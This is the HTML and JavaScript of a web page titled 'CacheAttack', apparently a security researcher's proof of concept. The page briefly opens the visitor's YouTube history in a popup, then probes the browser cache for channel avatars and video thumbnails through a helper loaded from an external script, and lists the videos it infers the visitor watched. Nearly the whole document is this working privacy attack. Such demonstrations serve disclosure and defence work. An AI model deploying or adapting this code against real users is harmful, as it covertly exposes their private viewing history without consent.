<!DOCTYPE html>
<html>
<head>
<title>CacheAttack</title>
<meta name="keywords" content="html,css,javascript,cache">
<meta name="author" content="NDev">
<meta name="description" CONTENT="Time based attack">
<link rel="stylesheet" href="/main.css">
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
<script src="https://ndev.tk/mirror/HackTimer/HackTimer.min.js"></script>
<script src="https://cache.ndev.tk/embed.js"></script>
</head>
<body>
<nav class="navbar navbar-expand-sm bg-dark navbar-dark">
   <a class="navbar-brand" style="color:red">
      <img src="https://ndev.tk/icon.webp" class="d-inline-block align-top" alt="CacheAttack">CacheAttack</a>
  <ul class="navbar-nav">
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk">Main</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk/network">Network</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk/files">Files</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk/Gender">Gender</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk/youtube">Youtube</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="https://github.com/NDevTK/CacheAttack/tree/master/youtube">Code</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="https://ndev.tk">HUB</a>
    </li>
  </ul>
</nav>
<div class="jumbotron">
<h1>Welcome to Youtube Detect</h1>
<p class="lead">Detects your last viewed YouTube videos.</p>
<button onclick="getHistory()">Click!</button>
</div>
   <b><p1 id="info"></p1></b>
<table id="dataTable" hidden="true">
    <thead>
        <tr><th>Youtube History</th></tr>
    </thead>
    <tbody id="data"></tbody>
</table>
</body>
<script>
async function getHistory() {
	var ads = open("https://m.youtube.com/feed/history/?app=m");
	setTimeout(async _  => ads.close(), 3000);
	setTimeout(async _  => {
		clearTable();
		var result = await getVideos();
	}, 3500);
}

function Video1(id) {
	return "https://i.ytimg.com/vi_webp/"+id+"/mqdefault.webp";
}

function Video2(id) {
	return "https://i.ytimg.com/vi/"+id+"/mqdefault.jpg";
}

async function addData(displayName) {
    dataTable.hidden = false;
    data.insertRow(0).insertCell(0).innerText = displayName;
}

function clearTable() {
    var rowCount = dataTable.rows.length; while(--rowCount) dataTable.deleteRow(rowCount);
    dataTable.hidden = true;
    info.innerText = "Loading...";
    info.hidden = false;
}

async function getVideos() {
  let r = await fetch("https://cache.ndev.tk/channels");
  let channels = await r.json();
  await YTCrawler(channels);
  info.hidden = true;
}

async function YTCrawler(channels) {
  for (var channel of channels) {
    let result = await ifCached(channel[1].concat("=s48-c-k-c0xffffffff-no-rj-mo"));
    if(!result) continue; // Channel not seen
    await new Promise(resolve => setTimeout(resolve, 1000));
    let r = await fetch("https://invidio.us/api/v1/channels/"+encodeURI(channel[0])+"/videos");
    let channelData = await r.json();
    if(channelData.error) continue
    for (var video of channelData) {
	    let result = await ifCached(Video1(video.videoId));
	    if(!result) result = await ifCached(Video2(video.videoId));
	    if (result) addData(video.title + " ("+video.videoId+")");
     };
  }
}
</script>
